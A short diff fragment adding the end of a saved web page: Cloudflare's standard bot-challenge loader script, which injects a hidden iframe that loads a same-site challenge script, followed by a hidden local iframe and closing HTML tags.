+<script>(function(){var js = "window['__CF$cv$params']={r:'788eb786b9c2879d',m:'MNvBCD9rHVPFoIrftH6kRnt5HOnrEIF0JIHeX26Kz4k-1673619042-0-Absf+Luf+Ja5+OAGO1rYkyuO8Az9yr/GNx3fX4PUDbVb8lzHnb1ODSCkovIRrnyWSC5ncqU3XLHQfIEfuA2jx2A4YQHudO4Xc59ksi50+79zG6SS2A3MSxO2mSVb2TVgagKmyJVfALqdg1zegfOZQPzc1b6zY+QDOr3lqiDvikmrKCLMaB5cdXUBizLrRDGX5rzNh4NRKGaCVx4bMhXyW9dNklqhSf1h+VgNn676liFh',s:[0x37d6a13664,0xa165bafb66],u:'/cdn-cgi/challenge-platform/h/g'};var now=Date.now()/1000,offset=14400,ts=''+(Math.floor(now)-Math.floor(now%offset)),_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/h/g/scripts/alpha/invisible.js?ts='+ts,document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.nonce = '';_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script>
+</div><iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" src="./index_files/saved_resource.html"></iframe></body></html> -->
